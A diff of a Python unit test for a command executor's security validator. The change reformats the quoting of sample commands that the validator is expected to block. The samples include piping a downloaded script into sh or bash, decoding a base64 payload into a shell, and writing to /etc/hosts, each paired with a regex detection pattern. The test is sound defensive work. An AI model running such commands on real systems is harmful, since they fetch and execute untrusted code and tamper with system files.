@@ -322,9 +322,9 @@ class TestSecurityFeatures(unittest.TestCase):
             r"wget\s+.*\|\s*sh": "wget -qO- http://example.com/install.sh | sh",
             r"wget\s+.*\|\s*bash": "wget -qO- http://example.com/install.sh | bash",
             r"curl\s+-o\s+-\s+.*\|": "curl -o - http://example.com/install.sh | sh",
-            r"\beval\s+": "eval \"echo hi\"",
-            r'python\s+-c\s+["\'].*exec': "python -c \"exec(\\\"print(1)\\\")\"",
-            r'python\s+-c\s+["\'].*__import__': "python -c \"__import__(\\\"os\\\")\"",
+            r"\beval\s+": 'eval "echo hi"',
+            r'python\s+-c\s+["\'].*exec': 'python -c "exec(\\"print(1)\\")"',
+            r'python\s+-c\s+["\'].*__import__': 'python -c "__import__(\\"os\\")"',
             r"base64\s+-d\s+.*\|": "base64 -d /tmp/payload | sh",
             r">\s*/etc/": "echo hi > /etc/hosts",
             r"sudo\s+su\s*$": "sudo su",
@@ -343,6 +343,7 @@ class TestSecurityFeatures(unittest.TestCase):
 
             is_valid, violation = self.executor.validate_command(test_cmd)
             self.assertFalse(is_valid, f"Pattern should be blocked: {pattern}")
+
     def test_path_traversal_protection(self):
         """Test protection against path traversal attacks."""
         traversal_commands = [
